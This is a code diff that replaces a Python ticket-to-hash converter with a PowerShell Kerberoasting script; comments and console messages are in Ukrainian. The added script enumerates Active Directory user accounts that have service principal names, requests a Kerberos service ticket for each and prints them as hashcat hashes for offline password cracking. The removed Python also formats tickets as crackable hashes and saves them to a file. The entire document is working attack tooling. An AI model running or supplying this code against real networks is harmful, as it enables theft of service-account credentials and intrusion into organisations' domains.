@@ -1,27 +1,23 @@
-import base64
-import sys
+$searcher = [adsisearcher]"(&(servicePrincipalName=*)(samAccountType=805306368))"
+$targets = $searcher.FindAll()
 
-# ВСТАВ СВІЙ BASE64 МІЖ ЛАПКАМИ НИЖЧЕ
-b64_input = """
-ТВІЙ_BASE64_ТУТ
-"""
+Write-Host "`n[!] Формування хешів для Hashcat (etype 23)..." -ForegroundColor Yellow
 
-try:
-    # Очищуємо вхідні дані від пробілів та переносів
-    clean_b64 = "".join(b64_input.split())
-    # Декодуємо
-    ticket_bytes = base64.b64decode(clean_b64)
-    # Формуємо хеш (etype 23 - RC4)
-    # Ми використовуємо заглушки для USER/DOMAIN/SPN, бо для зламу вони не важливі
-    hash_string = f"$krb5tgs$23$*USER*DOMAIN*SPN*${ticket_bytes.hex()}"
+foreach ($target in $targets) {
+    $spn = $target.Properties.serviceprincipalname[0]
+    $sam = $target.Properties.samaccountname[0]
     
-    print("\n[+] Ось твій хеш для Hashcat:")
-    print(hash_string)
-    
-    # Зберігаємо у файл
-    with open("my_hashes.txt", "a") as f:
-        f.write(hash_string + "\n")
-    print("\n[!] Хеш також збережено у файл my_hashes.txt")
-
-except Exception as e:
-    print(f"[-] Помилка: {e}")
+    try {
+        $tokenObj = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
+        $data = $tokenObj.GetRequest()
+        
+        $hex = [System.BitConverter]::ToString($data).Replace("-", "").ToLower()
+        
+        $hashcat_format = "`$krb5tgs`$23`$*$sam`$USER_DOMAIN`$$spn`$*$hex"
+        
+        Write-Host "`n[+] SPN: $spn" -ForegroundColor Cyan
+        Write-Host $hashcat_format
+    } catch {
+        
+    }
+}
